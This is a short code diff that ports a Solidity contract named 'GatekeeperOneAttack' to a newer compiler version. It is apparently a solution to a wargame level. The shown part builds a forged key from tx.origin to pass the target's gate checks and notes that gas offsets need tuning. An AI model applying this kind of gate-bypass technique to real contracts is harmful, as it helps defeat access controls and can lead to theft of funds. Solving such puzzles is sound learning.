@@ -1,11 +1,11 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract GatekeeperOneAttack {
 
-  constructor(address GatekeeperOneContractAddress) public {
-    bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
+  constructor(address GatekeeperOneContractAddress) {
+    bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);
     
     // NOTE: the proper gas offset to use will vary depending on the compiler
     // version and optimization settings used to deploy the factory contract.
